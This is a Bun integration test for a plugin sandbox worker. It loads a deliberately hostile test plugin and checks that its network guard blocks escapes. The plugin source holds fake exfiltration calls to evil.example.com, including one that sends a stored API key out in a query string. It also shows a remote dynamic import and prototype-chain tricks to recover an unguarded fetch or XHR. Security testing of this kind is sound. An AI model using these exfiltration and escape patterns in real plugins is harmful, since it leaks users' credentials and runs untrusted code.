// Copyright (c) 2026 Juan Ignacio Molina Estrada
// SPDX-License-Identifier: FSL-1.1-Apache-2.0
/**
 * Runtime integration test for the plugin sandbox WORKER.
 *
 * Unlike network-guard.test.ts (pure isUrlAllowed logic), this test spins up a
 * REAL Worker running the actual sandbox-worker.ts, loads a real (hostile) test
 * plugin module inside it via blob import, and drives the postMessage RPC — the
 * same mechanics the browser uses. Bun supports Workers + `import(blobURL)`, so
 * this exercises: worker boot, module eval, manifest id/version enforcement,
 * the network guard at runtime, credential scoping, and the import() residual.
 *
 * A tiny loopback HTTP server stands in for an "allowed" host so allowed
 * requests are hermetic (127.0.0.1 only, no external network).
 */
import { afterAll, beforeAll, describe, expect, test } from 'bun:test'

type Loaded = { manifest: { id: string; version: string } }

// ── loopback "allowed host" ──────────────────────────────────────────

let server: ReturnType<typeof Bun.serve>
let allowedPort = 0

beforeAll(() => {
  server = Bun.serve({
    port: 0,
    hostname: '127.0.0.1',
    fetch: () => new Response('ok', { status: 200 }),
  })
  allowedPort = server.port
})

afterAll(() => {
  server?.stop(true)
})

// ── worker harness ───────────────────────────────────────────────────

const WORKER_URL = new URL('../sandbox/sandbox-worker.ts', import.meta.url)

type Harness = {
  worker: Worker
  load: (
    moduleText: string,
    expected?: { id: string; version: string },
  ) => Promise<Loaded>
  call: (msg: Record<string, unknown>) => Promise<unknown>
  terminate: () => void
}

function makeHarness(): Harness {
  const worker = new Worker(WORKER_URL, { type: 'module' })
  let nextId = 1
  const pending = new Map<
    number,
    { resolve: (v: unknown) => void; reject: (e: Error) => void }
  >()
  let loadResolve: ((v: Loaded) => void) | null = null
  let loadReject: ((e: Error) => void) | null = null

  worker.onmessage = (event: MessageEvent) => {
    const msg = event.data as Record<string, unknown>
    if (msg.type === 'loaded') {
      loadResolve?.({ manifest: msg.manifest as Loaded['manifest'] })
    } else if (msg.type === 'load-error') {
      loadReject?.(new Error(String(msg.error)))
    } else if (msg.type === 'result') {
      const p = pending.get(msg.id as number)
      if (!p) return
      pending.delete(msg.id as number)
      if (msg.ok) p.resolve(msg.value)
      else p.reject(new Error(String(msg.error)))
    }
  }

  return {
    worker,
    load: (moduleText, expected) =>
      new Promise<Loaded>((resolve, reject) => {
        loadResolve = resolve
        loadReject = reject
        worker.postMessage({ type: 'load', moduleText, expected })
      }),
    call: (msg) =>
      new Promise((resolve, reject) => {
        const id = nextId++
        pending.set(id, { resolve, reject })
        worker.postMessage({ ...msg, id })
      }),
    terminate: () => worker.terminate(),
  }
}

// ── hostile test plugin (source string, imported via blob in worker) ──

function testPluginSource(allowedHost: string): string {
  // Declares only `allowedHost` in network.hosts. execute() probes each vector
  // and reports the resulting error NAME so the test can distinguish a guard
  // denial (PluginNetworkDeniedError) from a plain network failure.
  return `
export const manifest = {
  id: 'evil-connector',
  name: 'Evil Connector',
  version: '2.0.0',
  author: 'attacker',
  description: 'probes sandbox escape vectors',
  capabilities: [],
  config: {},
  network: { hosts: ['${allowedHost}'] },
}

let secret = null

async function probe(fn) {
  try {
    const value = await fn()
    return { threw: false, value }
  } catch (err) {
    return { threw: true, name: err && err.name, message: String(err && err.message).slice(0, 120) }
  }
}

export function createPlugin(m) {
  return {
    manifest: m,
    status: 'installed',
    config: {},
    initialize: async (config) => { secret = config.secret ?? null },
    execute: async ({ params }) => {
      const action = params && params.action
      if (action === 'fetch-allowed') {
        return probe(async () => {
          const r = await fetch('http://${allowedHost}:${allowedPort}/ok')
          return await r.text()
        })
      }
      if (action === 'fetch-denied') {
        return probe(() => fetch('https://evil.example.com/steal'))
      }
      if (action === 'ws-denied') {
        return probe(() => { const ws = new WebSocket('wss://evil.example.com'); return ws.url })
      }
      if (action === 'exfil-secret-fetch') {
        return probe(() => fetch('https://evil.example.com/?k=' + encodeURIComponent(secret)))
      }
      if (action === 'import-denied') {
        // import() is NOT wrapped by the guard — documents the residual.
        return probe(() => import('https://evil.example.com/x.js'))
      }
      if (action === 'has-secret') {
        return { threw: false, value: secret }
      }
      if (action === 'sees-tauri') {
        return { threw: false, value: typeof globalThis.__TAURI_INTERNALS__ }
      }
      if (action === 'indexeddb-gone') {
        return { threw: false, value: typeof globalThis.indexedDB }
      }
      if (action === 'recover-fetch-via-proto') {
        // Try to escape by grabbing an un-wrapped fetch off the prototype chain.
        return probe(async () => {
          const proto = Object.getPrototypeOf(globalThis)
          const f = proto && proto.fetch
          if (typeof f !== 'function') throw new Error('no proto fetch')
          return await f.call(globalThis, 'https://evil.example.com/steal')
        })
      }
      if (action === 'xhr-parent-escape') {
        // Grab the real XHR.open off the parent prototype and open to a denied
        // host. Robustly guarded: prototype.open is patched, so this must deny.
        // (Bun workers have no XMLHttpRequest; browsers do — see the in-browser
        // preview validation for the enforced case.)
        if (typeof XMLHttpRequest === 'undefined') {
          return { threw: false, value: 'no-xhr-in-runtime' }
        }
        return probe(() => {
          const x = new XMLHttpRequest()
          const proto = Object.getPrototypeOf(x)
          proto.open.call(x, 'GET', 'https://evil.example.com')
          return 'opened'
        })
      }
      return { threw: false, value: 'noop' }
    },
  }
}
`
}

// ── tests ────────────────────────────────────────────────────────────

describe('sandbox worker (runtime integration)', () => {
  test('boots, loads a module via blob import, returns the manifest', async () => {
    const h = makeHarness()
    try {
      const loaded = await h.load(testPluginSource('127.0.0.1'))
      expect(loaded.manifest.id).toBe('evil-connector')
      expect(loaded.manifest.version).toBe('2.0.0')
    } finally {
      h.terminate()
    }
  })

  test('rejects a module whose id/version does not match expected', async () => {
    const h = makeHarness()
    try {
      await expect(
        h.load(testPluginSource('127.0.0.1'), {
          id: 'okx-connector',
          version: '2.0.0',
        }),
      ).rejects.toThrow(/declares id/)
    } finally {
      h.terminate()
    }
  })

  test('allows fetch to a declared host (reaches real network, no guard denial)', async () => {
    const h = makeHarness()
    try {
      await h.load(testPluginSource('127.0.0.1'))
      const r = (await h.call({
        type: 'execute',
        params: {
          capability: 'x',
          params: { action: 'fetch-allowed' },
          context: {},
        },
      })) as {
        threw: boolean
        value?: string
      }
      expect(r.threw).toBe(false)
      expect(r.value).toBe('ok')
    } finally {
      h.terminate()
    }
  })

  test('denies fetch to an undeclared host with PluginNetworkDeniedError', async () => {
    const h = makeHarness()
    try {
      await h.load(testPluginSource('127.0.0.1'))
      const r = (await h.call({
        type: 'execute',
        params: {
          capability: 'x',
          params: { action: 'fetch-denied' },
          context: {},
        },
      })) as {
        threw: boolean
        name?: string
      }
      expect(r.threw).toBe(true)
      expect(r.name).toBe('PluginNetworkDeniedError')
    } finally {
      h.terminate()
    }
  })

  test('denies WebSocket to an undeclared host', async () => {
    const h = makeHarness()
    try {
      await h.load(testPluginSource('127.0.0.1'))
      const r = (await h.call({
        type: 'execute',
        params: {
          capability: 'x',
          params: { action: 'ws-denied' },
          context: {},
        },
      })) as {
        threw: boolean
        name?: string
      }
      expect(r.threw).toBe(true)
      expect(r.name).toBe('PluginNetworkDeniedError')
    } finally {
      h.terminate()
    }
  })

  test('a credential from initialize() cannot be exfiltrated to an undeclared host', async () => {
    const h = makeHarness()
    try {
      await h.load(testPluginSource('127.0.0.1'))
      await h.call({ type: 'initialize', config: { secret: 'API-KEY-abc123' } })
      const has = (await h.call({
        type: 'execute',
        params: {
          capability: 'x',
          params: { action: 'has-secret' },
          context: {},
        },
      })) as {
        value?: string
      }
      expect(has.value).toBe('API-KEY-abc123') // plugin holds it...
      const exfil = (await h.call({
        type: 'execute',
        params: {
          capability: 'x',
          params: { action: 'exfil-secret-fetch' },
          context: {},
        },
      })) as {
        threw: boolean
        name?: string
      }
      expect(exfil.threw).toBe(true) // ...but cannot send it out via fetch
      expect(exfil.name).toBe('PluginNetworkDeniedError')
    } finally {
      h.terminate()
    }
  })

  test('cannot recover an unwrapped fetch off the prototype chain', async () => {
    const h = makeHarness()
    try {
      await h.load(testPluginSource('127.0.0.1'))
      const r = (await h.call({
        type: 'execute',
        params: {
          capability: 'x',
          params: { action: 'recover-fetch-via-proto' },
          context: {},
        },
      })) as {
        threw: boolean
        name?: string
      }
      expect(r.threw).toBe(true)
      // Either the proto fetch is the guarded one (denies) or there is none.
      expect(['PluginNetworkDeniedError', 'Error']).toContain(r.name)
    } finally {
      h.terminate()
    }
  })

  test('the credential store and Tauri IPC are unreachable; indexedDB removed', async () => {
    const h = makeHarness()
    try {
      await h.load(testPluginSource('127.0.0.1'))
      const tauri = (await h.call({
        type: 'execute',
        params: {
          capability: 'x',
          params: { action: 'sees-tauri' },
          context: {},
        },
      })) as { value?: string }
      expect(tauri.value).toBe('undefined')
      const idb = (await h.call({
        type: 'execute',
        params: {
          capability: 'x',
          params: { action: 'indexeddb-gone' },
          context: {},
        },
      })) as { value?: string }
      expect(idb.value).toBe('undefined')
    } finally {
      h.terminate()
    }
  })

  test('XHR real open cannot be recovered off the parent prototype', async () => {
    const h = makeHarness()
    try {
      await h.load(testPluginSource('127.0.0.1'))
      const r = (await h.call({
        type: 'execute',
        params: {
          capability: 'x',
          params: { action: 'xhr-parent-escape' },
          context: {},
        },
      })) as { threw: boolean; name?: string; value?: string }
      if (r.value === 'no-xhr-in-runtime') {
        // Runtime (Bun) has no XMLHttpRequest — nothing to guard here.
        expect(r.threw).toBe(false)
      } else {
        expect(r.threw).toBe(true)
        expect(r.name).toBe('PluginNetworkDeniedError')
      }
    } finally {
      h.terminate()
    }
  })

  // Documents the KNOWN residual: dynamic import() is not wrapped by the guard.
  // On desktop the CSP script-src blocks remote import; in this runtime there is
  // no CSP, so import() is NOT a guard denial. This test asserts the current
  // behavior so a future fix (that makes it a denial) will flip it intentionally.
  test('RESIDUAL: dynamic import() is not intercepted by the network guard', async () => {
    const h = makeHarness()
    try {
      await h.load(testPluginSource('127.0.0.1'))
      const r = (await h.call({
        type: 'execute',
        params: {
          capability: 'x',
          params: { action: 'import-denied' },
          context: {},
        },
      })) as {
        threw: boolean
        name?: string
      }
      // It fails (can't resolve the remote module) but NOT via the guard.
      expect(r.name).not.toBe('PluginNetworkDeniedError')
    } finally {
      h.terminate()
    }
  })
})
